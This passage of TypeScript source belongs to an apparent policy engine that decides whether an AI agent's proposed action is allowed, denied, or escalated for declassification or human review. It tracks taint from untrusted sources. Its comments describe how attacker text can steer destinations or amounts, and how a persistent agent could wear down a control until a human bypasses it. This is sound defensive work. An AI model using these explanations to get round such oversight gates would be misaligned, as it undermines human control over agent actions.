    if (r.scope?.source != null && !a.arg.derivedFrom.includes(r.scope.source)) {
      rejections.push(
        reason(
          "receipt_source_mismatch",
          `receipt ${r.id} is bound to source ${r.scope.source}, which did not feed "${a.arg.name}"`,
        ),
      );
      continue;
    }
    if (!taintAtMost(a.taint, r.lifts)) {
      rejections.push(
        reason("taint_exceeds_ceiling", `receipt ${r.id} lifts only to ${r.lifts}, not ${a.taint}`),
      );
      continue;
    }
    if (!row.liftableBy.has(r.rule)) {
      rejections.push(
        reason("receipt_capability_mismatch", `${capability} does not admit the ${r.rule} rule`),
      );
      continue;
    }
    return { covering: r, rejections };
  }
  return { covering: undefined, rejections };
}

/**
 * Canonical name and value for a tuple, so a tuple receipt binds to an exact combination.
 *
 * Sorted by argument name, so the same pair in a different argument order produces the same key -
 * and a DIFFERENT pair produces a different one. That is what stops a receipt for one combination
 * admitting a reordered or substituted one.
 */
// Keyed by SLOT, not by label, since v0.9. Two arguments sharing a name produced the key "url+url",
// under which a tuple ratified for one pair would match a different pair - defect §11's confusion at
// the combination layer. `admitConfirmedTuple` builds the same key the same way, from
// `argPath ?? argName`, so the two stay symmetric; where names are unique the slot IS the name and
// nothing observable changes.
const tupleKey = (assessments: readonly ArgAssessment[], roles: readonly ParamRole[]): string =>
  assessments
    .filter((a) => roles.includes(a.arg.role))
    .map((a) => a.slot)
    .sort()
    .join("+");

const tupleValue = (assessments: readonly ArgAssessment[], roles: readonly ParamRole[]): string =>
  assessments
    .filter((a) => roles.includes(a.arg.role))
    .map((a) => `${a.slot}=${a.arg.value ?? ""}`)
    .sort()
    .join("&");

/** Everything the engine learned about one argument. */
interface ArgAssessment {
  readonly arg: ActionArg;
  readonly taint: Taint;
  readonly provenance: ReadonlySet<Provenance>;
  readonly ceiling: Taint;
  /** This argument's identity within the action. See `slotsOf`. */
  readonly slot: string;
  /** Whether the argument's LABEL alone identifies it. False when the name repeats. */
  readonly labelIsUnambiguous: boolean;
}

/**
 * Give every argument of an action a stable, unique identity.
 *
 * `name` is a label and labels repeat. This turns a list of possibly-repeating labels into a list of
 * distinct slots, which is what a receipt has to bind to if "a receipt admits one value into one
 * slot" is going to be true rather than aspirational.
 *
 * THE RULES, in order:
 *   1. An explicit `path` is the slot. The caller knows their own schema; nothing here second-guesses
 *      it.
 *   2. A name that occurs exactly once in the action is its own slot. No ceremony for the common case.
 *   3. A repeated name becomes `name[i]`, positionally. Deterministic, and it exists so the engine
 *      can still tell the arguments apart - NOT so a receipt can guess which one it meant. A
 *      label-only receipt does not match a repeated name at all.
 *   4. If two arguments still collide - the caller gave two of them the same explicit `path` - the
 *      later ones are suffixed so slots stay unique, and neither is matchable by label. A colliding
 *      path is a caller bug, and the safe reading of a caller bug is that nothing is admitted.
 *
 * Pure and total: no throw, no clock, no allocation the caller can observe.
 */
export function slotsOf(args: readonly ActionArg[]): readonly string[] {
  const nameCounts = new Map<string, number>();
  for (const a of args) nameCounts.set(a.name, (nameCounts.get(a.name) ?? 0) + 1);

  const used = new Set<string>();
  const seenName = new Map<string, number>();
  const out: string[] = [];
  for (const a of args) {
    let slot: string;
    if (a.path !== undefined && a.path !== "") {
      slot = a.path;
    } else if ((nameCounts.get(a.name) ?? 0) === 1) {
      slot = a.name;
    } else {
      const i = seenName.get(a.name) ?? 0;
      seenName.set(a.name, i + 1);
      slot = `${a.name}[${i}]`;
    }
    // Rule 4. Uniqueness is what the whole model rests on, so it is enforced rather than assumed.
    let unique = slot;
    let n = 0;
    while (used.has(unique)) unique = `${slot}#${++n}`;
    used.add(unique);
    out.push(unique);
  }
  return out;
}

/**
 * Whether each argument's LABEL alone identifies it.
 *
 * A label-only receipt is admissible only where this is true. Note it is false for BOTH arguments of
 * a duplicated pair, not just the second: the issuer of a label-only receipt cannot have meant one
 * rather than the other, so neither is a safe match.
 */
function labelUnambiguous(
  args: readonly ActionArg[],
  slots: readonly string[],
): readonly boolean[] {
  const nameCounts = new Map<string, number>();
  for (const a of args) nameCounts.set(a.name, (nameCounts.get(a.name) ?? 0) + 1);
  return args.map((a, i) => (nameCounts.get(a.name) ?? 0) === 1 && slots[i] === a.name);
}

/**
 * Everything about the input that must hold before the engine can reason about it at all.
 *
 * Returns a description of the FIRST structural fault, or `undefined` when the shape is sound.
 *
 * WHY THIS EXISTS AT RUNTIME, when the types already say it. TypeScript guards the boundary it can
 * see. It does not guard a JavaScript caller, a JSON payload deserialised straight off a queue, an
 * `any` that crossed a package edge, or a hand-built object in a test - and the published package
 * ships CJS and ESM to consumers with no compiler at all. This engine promises never to throw, and
 * a promise that holds only for well-typed callers is not the promise the comment above `decide`
 * makes. See DEFECTS_FOUND.md section 24.
 *
 * Every fault answers DENY, never ALLOW. A malformed decision request is a bug or an attack, and
 * both deserve the same answer.
 */
function structuralFault(input: DecisionInput): string | undefined {
  if (typeof input !== "object" || input === null) return "the decision input is not an object";

  const action = input.action;
  if (typeof action !== "object" || action === null) return "`action` is missing";
  if (!Array.isArray(action.args)) return "`action.args` is not an array";
  for (const arg of action.args) {
    if (typeof arg !== "object" || arg === null)
      return "an entry of `action.args` is not an object";
    if (arg.derivedFrom !== undefined && !Array.isArray(arg.derivedFrom)) {
      return `argument "${String(arg.name)}" has a \`derivedFrom\` that is not an array`;
    }
  }

  if (!Array.isArray(input.sources)) return "`sources` is not an array";
  for (const source of input.sources) {
    if (typeof source !== "object" || source === null)
      return "an entry of `sources` is not an object";
    if (source.derivedFrom !== undefined && !Array.isArray(source.derivedFrom)) {
      return `source "${String(source.id)}" has a \`derivedFrom\` that is not an array`;
    }
  }

  if (input.receipts !== undefined) {
    if (!Array.isArray(input.receipts)) return "`receipts` is not an array";
    // THE ELEMENTS, NOT JUST THE ARRAY. The first version of this gate checked `sources` and
    // `action.args` element by element and stopped at `Array.isArray` for receipts, so
    // `receipts: [null]` walked straight past it and `coverFor` threw reading `argPath` off it.
    // A gate written to make the engine total, that was itself not total. Found by the malformed
    // input search rather than by anything already here. See DEFECTS_FOUND.md section 32.
    for (const receipt of input.receipts) {
      if (typeof receipt !== "object" || receipt === null) {
        return "an entry of `receipts` is not an object";
      }
    }
  }
  return undefined;
}

/**
 * Judge one proposed action.
 *
 * Pure, synchronous, reads no clock, generates no randomness, and never throws - asserted by
 * `packages/core/test/total.test.ts`, which drives every malformed shape through it and requires
 * DENY rather than an exception. The sentence was FALSE from the day it was written until v1.0.1:
 * a null input, a missing `action` and any non-array `sources` all threw. See DEFECTS_FOUND.md
 * section 24 for why nothing here could have noticed.
 *
 * PRECEDENCE, and each ordering is a decision rather than an accident:
 *
 *   1. unknown capability                                   -> DENY
 *   2. over ceiling, row is unliftable                      -> DENY
 *   3. over ceiling, a rule could lift it                   -> NEEDS_DECLASSIFICATION
 *   4. within ceiling, confirmation required and absent     -> NEEDS_REVIEW
 *   5. otherwise                                            -> ALLOW
 *
 * Step 2 before step 3 avoids a LIVELOCK. Answering NEEDS_DECLASSIFICATION on a row whose
 * `liftableBy` is empty asks for a receipt no rule can issue, so the request is unsatisfiable and a
 * persistent agent grinds against it until a budget runs out or a human gets tired and routes
 * around the control. `wallet_sign` and `account_modify` are exactly the two rows where that
 * matters, and exactly the two where an attacker has the most incentive to keep trying.
 *
 * Step 3 before step 4 keeps two different questions apart. Declassification asks "here is the raw
 * untrusted text, is this extracted value what you meant?". Confirmation asks "this moves money and
 * cannot be undone, proceed?". Prompting for confirmation while inputs are still undischarged asks
 * a human to launder taint by clicking, and both interactions look like a dialog, which is why the
 * conflation is so common.
 */
export function decide(
  input: DecisionInput,
  policy: CapabilityPolicy = CAPABILITY_POLICY,
): Verdict {
  // ---- structural gate: a malformed request is denied, not thrown on --------------------------
  const fault = structuralFault(input);
  if (fault !== undefined) {
    return {
      decision: "DENY",
      capability: (input?.action?.capability ?? "unknown_capability") as Capability,
      taint: "UNTRUSTED_EXTERNAL",
      provenance: new Set<Provenance>(),
      reasons: [reason("malformed_input", `the decision input is malformed: ${fault}`)],
      effects: [{ type: "LOG_DECISION" }],
      spends: [],
    };
  }

  const { action } = input;
  const row: CapabilityRow | undefined = policy[action.capability];
  const byId = new Map<string, Source>(input.sources.map((s) => [s.id as string, s]));
  /**
   * One memo for the whole decision. Sources are shared between arguments far more often than not -
   * that is what a context window IS - so resolving them once per action rather than once per
   * argument is both faster and the only way the diamond repair stays linear.
   */
  const resolved = new Map<string, ResolvedSource>();

  // ---- unknown capability: a deployment fault, so fail closed rather than ask a human ----------
  if (row === undefined) {
    return {
      decision: "DENY",
      capability: action.capability,
      taint: "UNTRUSTED_EXTERNAL",
      provenance: new Set<Provenance>(),
      reasons: [
        reason(
          "unknown_capability",
          `no policy row for "${action.capability}"; an undeclared capability is denied`,
        ),
      ],
      effects: [{ type: "LOG_DECISION" }],
      spends: [],
    };
  }

  // ---- assess every argument once --------------------------------------------------------------
  const assessments: ArgAssessment[] = [];
  const allProvenance = new Set<Provenance>();
  let overall: Taint = "CLEAN";
  // Identity before anything else: every later check that talks about "this argument" means a SLOT,
  // and a slot is only computable with the whole argument list in hand.
  const slots = slotsOf(action.args);
  const unambiguous = labelUnambiguous(action.args, slots);

  for (const [argIndex, arg] of action.args.entries()) {
    let taint: Taint = "CLEAN";
    const provenance = new Set<Provenance>();
    for (const from of arg.derivedFrom ?? []) {
      const r = resolveTaint(from, byId, resolved);
      taint = joinTaint(taint, r.taint);
      for (const p of r.provenance) {
        provenance.add(p);
        allProvenance.add(p);
      }
    }
    overall = joinTaint(overall, taint);
    assessments.push({
      arg,
      taint,
      provenance,
      ceiling: ceilingFor(row, arg.role),
      slot: slots[argIndex] as string,
      labelIsUnambiguous: unambiguous[argIndex] === true,
    });
  }

  // ---- the taint gate, per argument -------------------------------------------------------------
  const reasons: Reason[] = [];
  /**
   * SLOTS that needed a receipt and got one. The tuple gate keys off this, not off presence.
   *
   * Keyed by slot rather than by name since v0.9. With names, two arguments sharing a label made the
   * gate see one admission where there were two - the same confusion as defect §11, one layer up.
   */
  const admittedByReceipt = new Set<string>();
  /** Receipts this decision actually used. The shell must mark these spent, atomically with acting. */
  const spent: ReceiptId[] = [];
  const overCeiling = assessments.filter((a) => !taintAtMost(a.taint, a.ceiling));

  if (overCeiling.length > 0) {
    const unlifted: ArgAssessment[] = [];
    // One receipt, one argument. See coverFor's `usedReceipts` parameter and DEFECTS_FOUND.md §11.
    const usedReceipts = new Set<ReceiptId>();
    for (const a of overCeiling) {
      // Every reason a receipt might fail to cover this argument, reported rather than silently
      // skipped. A receipt that was rejected for replay looks identical, from the outside, to no
      // receipt at all - and those are very different events. The first is an adversary.
      const { covering, rejections } = coverFor(a, input, row, action.capability, usedReceipts);
      for (const rj of rejections) reasons.push(rj);
      if (covering !== undefined) {
        reasons.push(
          // THE SLOT, NOT THE LABEL. Two arguments may share a label - `slotsOf` exists precisely
          // because they may - so a reason naming only the label cannot say WHICH of them was
          // admitted, and that is the one question a reader of a declassification reason has. The
          // slot equals the label whenever the label is unique, so most messages are unchanged.
          // See DEFECTS_FOUND.md section 37.
          reason("declassified", `"${a.slot}" admitted by ${covering.rule}`, {
            value: undefined,
          }),
        );
        spent.push(covering.id);
        usedReceipts.add(covering.id);
        admittedByReceipt.add(a.slot);
        continue;
      }
      unlifted.push(a);
    }

    if (unlifted.length > 0) {
      for (const a of unlifted) {
        // Both reasons, general fact first. `taint_exceeds_ceiling` is WHAT happened;
        // `egress_with_tainted_input` is WHY this particular argument is the dangerous one.
        // Emitting only the specific code loses the general one, and a grader that asked for the
        // general fact would then score a correct refusal as a miss - which is how a real
        // disagreement between the corpus and the engine surfaced during the first run of this
        // suite. Reasons are additive; there is no cost to saying both true things.
        reasons.push(
          reason(
            "taint_exceeds_ceiling",
            `"${a.arg.name}" (${a.arg.role}) is ${a.taint} but ${action.capability} admits at most ` +
              `${a.ceiling} there. ${row.approvalBoundary}`,
          ),
        );
        if (row.egress === "full" && a.arg.role === "sink_identity") {
          reasons.push(
            reason(
              "egress_with_tainted_input",
              `${action.capability} sends caller-chosen bytes outward and "${a.arg.name}" chose the destination`,
            ),
          );
        }
        if (row.effect === "irreversible") {
          reasons.push(reason("irreversible_effect", `${action.capability} cannot be undone`));
        }
      }

      // A draft escalates instead of refusing. Placed BEFORE the deny/declassify split because for a
      // capability that produces no effect, neither of those answers is right: a flat DENY removes
      // the artifact the human was going to review, and asking for a declassification demands a
      // receipt before there is anything concrete to show them. Building it and routing it to a
      // person is the whole point of having a prepare step.
      if (row.draftOnly === true) {
        reasons.push(
          reason(
            "draft_requires_review",
            `${action.capability} produces a draft, not an effect, so it is built and escalated ` +
              `rather than refused. ${row.approvalBoundary}`,
          ),
        );
        return {
          decision: "NEEDS_REVIEW",
          capability: action.capability,
          taint: overall,
          provenance: allProvenance,
          reasons,
          effects: [
            { type: "LOG_DECISION" },
            { type: "ESCALATE", summary: `${action.tool}: draft steered by untrusted input` },
          ],
          spends: [],
        };
      }

      // Unliftable row: DENY, not NEEDS_DECLASSIFICATION. See the livelock note above.
      if (row.liftableBy.size === 0) {
        return {
          decision: "DENY",
          capability: action.capability,
          taint: overall,
          provenance: allProvenance,
          reasons,
          effects: [{ type: "LOG_DECISION" }],
          spends: [],
        };
      }

      reasons.push(
        reason(
          "declassification_available",
          `one of [${[...row.liftableBy].sort().join(", ")}] would admit this`,
        ),
      );
      return {
        decision: "NEEDS_DECLASSIFICATION",
        capability: action.capability,
        taint: overall,
        provenance: allProvenance,
        reasons,
        effects: [{ type: "LOG_DECISION" }],
        spends: [],
      };
    }
  }

  // ---- mixed provenance ---------------------------------------------------------------------------
  // Evaluated HERE and not in the taint gate. Mixing is not a higher level - the join already
  // accounts for level - it is a statement about COMPOSITION: user intent stapled to attacker text.
  // Put it in the taint gate and a declassification receipt discharges it, which is wrong.
  //
  // MIXING IS PER-ARGUMENT AND PER-ROLE. Two narrowings, and each one was forced by a case that the
  // broader version got wrong.
  //
  // NOT PER-ACTION. Every useful agent task combines user intent with untrusted content - that is
  // what an agent IS - so an action-level test fires on essentially everything, and a prompt that
  // fires on everything is a click-through rather than a control. "Summarise this thread and send it
  // to alice@ourcorp.com" mixes at the action level and at no argument: the recipient is purely the
  // user's, the body purely the thread's. Holdout case email-h-002 is exactly this, and the
  // action-level version over-blocked it.
  //
  // AND ONLY FOR STEERING ROLES. A spliced PAYLOAD is the normal case - "save this summary", where
  // the content is part the user's words and part a fetched page - and escalating it is the second
  // way this rule over-blocks. What matters is a splice in an argument that decides WHERE the action
  // goes or HOW MUCH it moves.
  //
  // WHAT THIS BRANCH DOES AND DOES NOT DO, stated correctly. An earlier version of this comment
  // claimed the branch "cannot fire, and that is a proven property". That was wrong, and the
  // correction matters in a repository whose whole argument is honest reporting.
  //
  // It fires. A `read_only_tool` call whose `sink_identity` is assembled from a TOOL_OUTPUT source
  // and a SYSTEM source produces `reasons: [mixed_provenance, within_taint_ceiling]` - the splice is
  // detected and reported. What it cannot currently do is change the DECISION, because the
  // escalation below is gated on `row.effect === "irreversible"`, and `policy.test.ts` asserts that
  // every steering role on a capability with a real effect sits at or below USER_CONTROLLED. So any
  // splice that would reach the escalation has already exceeded its ceiling and been refused above.
  //
  // The distinction is worth keeping straight: the splice is OBSERVABLE in the audit trail today,
  // and it is INERT as a gate today. Loosen a steering ceiling on an acting capability and the gate
  // activates on its own while the invariant test fails at the same moment to say the band opened.
  // Deleting the check would make that future loosening silent.
  const mixed = assessments.some((a) => {
    if (!STEERING_ROLES.has(a.arg.role)) return false;
    const classes = new Set<Taint>([...a.provenance].map(taintOf));
    return classes.size > 1;
  });
  if (mixed) {
    reasons.push(
      reason(
        "mixed_provenance",
        "an argument that steers this action was assembled from more than one trust class",
      ),
    );
  }

  // ---- the tuple gate ------------------------------------------------------------------------
  // Runs AFTER every argument has been individually cleared and BEFORE the confirmation gate,
  // because it is a question about a combination that only exists once the parts are admissible.
  //
  // Fires only on roles that were DECLASSIFIED separately. An action whose arguments were all within
  // their ceilings never reaches here, which is what keeps this from firing on ordinary traffic.
  for (const policy of row.tuplePolicies ?? []) {
    const separatelyAdmitted = assessments.filter(
      (a) => policy.roles.includes(a.arg.role) && admittedByReceipt.has(a.slot),
    );
    // DISTINCT roles, not merely two arguments. A "recipient and amount" policy means one of each;
    // two separately-admitted recipients are two instances of the same question, not the combination
    // the policy is about. The first version counted arguments and therefore fired on any two
    // same-role admissions - which a mutant surfaced by being rescued from its own defect.
    const rolesCovered = new Set(separatelyAdmitted.map((a) => a.arg.role));
    if (rolesCovered.size > 1) {
      const covered = (input.receipts ?? []).some(
        (r) =>
          r.rule === "tuple_confirmed" &&
          r.argName === tupleKey(assessments, policy.roles) &&
          (r.admitted === undefined || r.admitted === tupleValue(assessments, policy.roles)),
      );
      if (!covered) {
        reasons.push(
          reason(
            "tuple_requires_review",
            `${separatelyAdmitted.map((a) => `"${a.arg.name}"`).join(" and ")} were admitted separately. Each receipt answers a question nobody asked about the other, and the pair is one decision. ${row.approvalBoundary}`,
          ),
        );
        return {
          decision: "NEEDS_REVIEW",
          capability: action.capability,
          taint: overall,
          provenance: allProvenance,
          reasons,
          effects: [
            { type: "LOG_DECISION" },
            { type: "ESCALATE", summary: `${action.tool}: combination not reviewed together` },
          ],
          spends: [],
        };
      }
      reasons.push(reason("tuple_confirmed", `"${policy.id}" was ratified as one decision`));
    }
  }

  // ---- the confirmation gate ------------------------------------------------------------------------
  if ((row.requiresConfirmation || (mixed && row.effect === "irreversible")) && !input.confirmed) {
    reasons.push(
      reason(
        "confirmation_required",
        `${action.capability} requires a human. ${row.approvalBoundary}`,
      ),
    );
    return {
      decision: "NEEDS_REVIEW",
      capability: action.capability,
      taint: overall,
      provenance: allProvenance,
      reasons,
      effects: [
        { type: "LOG_DECISION" },
        { type: "ESCALATE", summary: `${action.tool}: ${row.approvalBoundary}` },
      ],
      spends: [],
    };
  }

  // ---- allow -----------------------------------------------------------------------------------------
  // A reason is pushed even here. An ALLOW with no reasons is indistinguishable from an ALLOW that
  // was never computed, which is exactly the artifact a lazy integration produces.
  reasons.push(
    reason("within_taint_ceiling", `every argument is within the ceiling for ${action.capability}`),
  );
  const effects: Effect[] = [{ type: "LOG_DECISION" }];
  return {
    decision: "ALLOW",
    capability: action.capability,
    taint: overall,
    provenance: allProvenance,
    reasons,
    effects,
    // Only an ALLOW spends. See the note on Verdict.spends.
    spends: spent,
  };
}

/** Convenience. Callers who only want the verdict word. */
export const decisionOf = (input: DecisionInput, policy?: CapabilityPolicy): Decision =>
  decide(input, policy).decision;
